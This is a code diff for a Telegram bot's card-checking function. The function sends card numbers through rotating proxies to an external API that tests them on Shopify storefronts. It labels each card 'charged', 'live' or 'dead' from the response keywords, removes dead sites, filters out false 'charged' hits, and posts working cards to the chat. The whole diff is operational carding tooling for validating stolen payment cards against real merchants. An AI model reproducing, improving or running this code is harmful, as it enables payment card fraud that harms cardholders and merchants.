@@ -315,13 +315,13 @@ class CheckerSession:
 def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
     if session_obj.stop_signal: return
 
-    # FIX 1: Increase Retry and Timeout for Single Check
+    # Settings for Single vs Mass
     max_retries = 3 if session_obj.mode == "single_quick" else 5
     timeout_val = 40 if session_obj.mode == "single_quick" else 25
     
     attempt = 0
     processed = False
-    last_error = "Unknown"
+    last_error = None
 
     while attempt < max_retries:
         attempt += 1
@@ -329,39 +329,36 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
         if session_obj.mode in ["mass_cc", "single_quick"]:
             if not session_obj.sites_pool:
                 if session_obj.mode == "single_quick":
-                    # Agar site hi nahi bachi toh batao
                     if processing_msg_id:
-                        try: bot.edit_message_text("❌ **Error:** No Live Sites in Database.", chat_id, processing_msg_id, parse_mode="Markdown")
-                        except: bot.send_message(chat_id, "❌ **Error:** No Live Sites in Database.")
+                        try: bot.edit_message_text("❌ **Error:** Database Empty.", chat_id, processing_msg_id, parse_mode="Markdown")
+                        except: pass
                 return
             target = random.choice(session_obj.sites_pool)
         else:
             target = session_obj.target
 
         try:
+            # 1. Prepare Request
             proxy = session_obj.proxy_string
             encoded_url = urllib.parse.quote(target)
             req_link = f"{API_URL}?cc={cc_line}&url={encoded_url}"
-            if proxy:
-                req_link += f"&proxy={proxy}"
+            if proxy: req_link += f"&proxy={proxy}"
 
+            # 2. Call API
             sess = get_session()
-            
-            # Request Send
             resp = sess.get(req_link, headers={"User-Agent": ua.random}, timeout=timeout_val)
-
+            
             raw_text = resp.text.strip()
             resp_lower = raw_text.lower()
 
-            # Proxy Dead Handling
+            # 3. Handle Dead Proxy/Site
             if "proxy dead" in resp_lower:
-                last_error = "Proxy Dead"
-                time.sleep(1.5)
+                print(f"⚠️ Proxy Dead: {proxy} (Retrying...)")
+                time.sleep(1)
                 continue 
 
-            # Site Dead Handling
             if "site dead" in resp_lower:
-                last_error = "Site Dead"
+                print(f"⚠️ Site Dead: {target} (Removing...)")
                 if session_obj.mode == "single_quick":
                     remove_dead_site(target, chat_id)
                 else:
@@ -372,15 +369,15 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
                         session_obj.sites_pool.remove(target)
                 continue
 
-            # Parsing Response
+            # 4. Parse Response
             try:
                 json_data = resp.json()
-                clean_msg = json_data.get("Response") or json_data.get("message") or raw_text
-                gate = json_data.get("Gate", "Shopify")
-                amount = json_data.get("Price", "N/A")
-                real_ip = json_data.get("ip") or json_data.get("proxy_ip") or json_data.get("ip_address") or json_data.get("remote_addr")
+                clean_msg = str(json_data.get("Response") or json_data.get("message") or raw_text)
+                gate = str(json_data.get("Gate", "Shopify"))
+                amount = str(json_data.get("Price", "N/A"))
+                real_ip = json_data.get("ip") or json_data.get("proxy_ip") or json_data.get("ip_address")
             except:
-                clean_msg = raw_text[:60]
+                clean_msg = str(raw_text)[:100]
                 gate = "Shopify"
                 amount = "N/A"
                 real_ip = None
@@ -391,14 +388,11 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
             charged_keys = ["order completed", "thank you", "confirmed", "successfully processed", "authorized", "paid", "success", "charge", "approved"]
             live_keys = ["incorrect_cvc", "incorrect cvc", "3ds", "insufficient_funds", "insufficient funds", "do not honor", "gateway rejected"]
 
-            if any(k in msg_lower for k in charged_keys):
-                status = "charged"
-            elif any(k in msg_lower for k in live_keys):
-                status = "live"
-            else:
-                status = "dead"
+            if any(k in msg_lower for k in charged_keys): status = "charged"
+            elif any(k in msg_lower for k in live_keys): status = "live"
+            else: status = "dead"
 
-            # Fake Charged Filtering
+            # 5. Fake Charged Check
             is_fake_charge = False
             if status == "charged":
                 with counter_lock:
@@ -407,6 +401,7 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
                 
                 if current_hits > 2:
                     is_fake_charge = True 
+                    # Clean previous spam
                     with counter_lock:
                         if chat_id in site_charge_msg_ids and target in site_charge_msg_ids[chat_id]:
                             for old_msg_id in site_charge_msg_ids[chat_id][target]:
@@ -421,17 +416,17 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
                         session_obj.dead_sites_count += 1
                     
                     if current_hits == 3:
-                        try:
-                            bot.send_message(chat_id, f"⚠️ **FAKE CHARGED DETECTED**\n🌐 `{target}`\n🗑️ Removing Site & Ignoring Result", parse_mode="Markdown")
+                        try: bot.send_message(chat_id, f"⚠️ **FAKE CHARGED REMOVED:**\n`{target}`", parse_mode="Markdown")
                         except: pass
                     status = "dead" 
 
+            # Update Counts
             with counter_lock:
                 if status == "charged": session_obj.charged += 1
                 elif status == "live": session_obj.live += 1
                 else: session_obj.dead += 1
 
-            # Response Building
+            # 6. Send Result
             is_hit = (status in ["charged", "live"]) and (not is_fake_charge)
             should_reply = is_hit or session_obj.mode == "single_quick"
 
@@ -446,10 +441,9 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
                 elif session_obj.mode == "single_quick":
                     resolved = get_my_ip(proxy)
                     px_display = resolved if resolved else "Hidden IP"
-                else:
-                    px_display = proxy.split('@')[-1] if "@" in proxy else proxy.split(":")[0] + ":****" if len(proxy.split(":")) == 4 else "Rotating Proxy"
+                else: px_display = "Rotating Proxy"
                 
-                final_amount = amount if amount == "N/A" else f"$ {amount}"
+                final_amount = f"$ {amount}" if amount != "N/A" else "N/A"
 
                 msg = (
                     f"{header} {emoji}\n"
@@ -470,41 +464,47 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
                     f"🛠 𝐃𝐄𝐕: BOYS ꭙ H4RE !!"
                 )
 
+                sent_msg = None
+                # FIX: Use Edit first (No disappear act), then Send if needed
                 if processing_msg_id:
-                    try: bot.delete_message(chat_id, processing_msg_id)
-                    except: pass
+                    try:
+                        sent_msg = bot.edit_message_text(msg, chat_id, processing_msg_id, parse_mode="Markdown")
+                    except Exception as e:
+                        # Agar edit fail ho (e.g. content same hai), toh naya bhejo
+                        try:
+                            sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
+                        except:
+                            sent_msg = bot.send_message(chat_id, msg) # Plain text fallback
+                else:
+                    try:
+                        sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
+                    except:
+                        sent_msg = bot.send_message(chat_id, msg)
 
-                # FIX 2: Safe Sending (Markdown Error Fallback)
-                try:
-                    sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
-                except:
-                    sent_msg = bot.send_message(chat_id, msg)
-
-                if status == "charged":
+                # Save ID for Fake Logic
+                if status == "charged" and sent_msg:
                     with counter_lock:
                         if chat_id not in site_charge_msg_ids: site_charge_msg_ids[chat_id] = {}
                         if target not in site_charge_msg_ids[chat_id]: site_charge_msg_ids[chat_id][target] = []
-                        if sent_msg: site_charge_msg_ids[chat_id][target].append(sent_msg.message_id)
+                        site_charge_msg_ids[chat_id][target].append(sent_msg.message_id)
 
             processed = True
-            time.sleep(1.0)
             break
 
         except Exception as e:
-            print(f"Check error: {e}")
+            print(f"❌ Worker Error: {e}") # Isse console me error dikhega
             last_error = str(e)
             continue
 
-    # FIX 3: Agar process fail hua, toh User ko batao (Silent Fail nahi hona chahiye)
     if not processed:
         with counter_lock: session_obj.dead += 1
         if session_obj.mode == "single_quick":
-            err_text = f"❌ **Checking Failed**\nReason: {last_error or 'Network Timeout'}"
+            err_msg = f"❌ **Request Failed**\nReason: {last_error or 'Connection Timeout'}"
             if processing_msg_id:
-                try: bot.edit_message_text(err_text, chat_id, processing_msg_id, parse_mode="Markdown")
-                except: bot.send_message(chat_id, err_text)
+                try: bot.edit_message_text(err_msg, chat_id, processing_msg_id, parse_mode="Markdown")
+                except: bot.send_message(chat_id, err_msg)
             else:
-                bot.send_message(chat_id, err_text)
+                bot.send_message(chat_id, err_msg)
 
     with counter_lock: session_obj.checked += 1
         
